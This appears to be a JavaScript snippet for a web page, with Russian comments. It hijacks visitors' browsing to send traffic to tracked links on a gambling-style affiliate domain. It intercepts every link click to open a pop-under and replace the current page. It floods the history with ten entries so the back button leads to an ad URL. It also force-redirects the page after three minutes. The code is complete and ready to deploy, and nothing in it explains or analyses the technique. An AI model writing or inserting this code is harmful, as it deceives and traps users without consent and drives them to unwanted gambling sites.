// Backunder Luck
var back = 'https://a.vivawins.com/visit/5a58e058-c985-4634-82d4-dd97bef6b880?track=BackButton';
var under = 'https://a.vivawins.com/visit/0b968054-fb69-4c9e-9de4-32de5782273a?track=Under';

if (typeof under !== "undefined" && under !== null) {
    document.addEventListener('click', function(event) {
        const target = event.target.closest('a'); // Современный подход
        if (target) {
            const linkHref = target.href;
            event.preventDefault();
            window.open(linkHref, '_blank'); // Открытие в новой вкладке
            window.location.replace(under);  // Замена текущей страницы
        }
    });
}

if (typeof back !== "undefined" && back !== null) {
    (function() {
        try {
            const URL = window.location.href.split(/[#]/)[0];
            for (let t = 0; t < 10; t++) history.pushState({}, '', URL + '#');
            window.onpopstate = function(event) {
                if (event.state) location.replace(back);
            };
        } catch (error) {
            console.error(error);
        }
    })();
}

// Redirect Function
function redirectAfterDelay() {
    const redirectUrl = "https://a.vivawins.com/visit/487b00df-a676-4fe5-8348-c4ee6287da4d?track=Redirect";
    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 180000); // 3 минуты
}
window.addEventListener('load', redirectAfterDelay);